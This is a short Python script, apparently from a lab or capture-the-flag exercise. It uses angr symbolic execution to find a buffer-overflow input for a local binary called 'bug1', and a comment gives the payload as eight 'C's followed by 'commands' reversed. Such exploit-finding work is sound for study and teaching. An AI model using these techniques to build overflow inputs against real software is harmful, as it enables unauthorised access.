import angr

#exploit payload must be "C"*8+"commands"[::-1]
#buffer buf can contain any random 8 bytes, hardcoding here as 'C'*8


proj = angr.Project("./bug1",load_options={"auto_load_libs": False})

#loading addresses of main and variables

main = proj.loader.find_symbol('main').rebased_addr
passwd = proj.loader.find_symbol('passwd').rebased_addr
buf = proj.loader.find_symbol('buf').rebased_addr


init_state = proj.factory.entry_state(addr=main)
#init_state.solver.add(buf='CCCCCCCC')
uname = init_state.solver.BVS('uname', 16*8)


#loop for hardocding 'C'*8 as buf so as to opyimize the angr path findin

j = 0
for i in uname.chop(8):
    j = j+1
    print(j)
    init_state.solver.add(i == 'C')
    if(j==8):
        break
init_state.memory.store(buf,uname)

sm = proj.factory.simulation_manager(init_state)
sm.explore(find = 0x000000000040059b, bad = 0x00000000004005ac)
 
if (sm.found != []):
    found = sm.found[0]
    solution = found.solver.eval(uname, cast_to=bytes)
    print(solution)

else:
    print("no overflow")
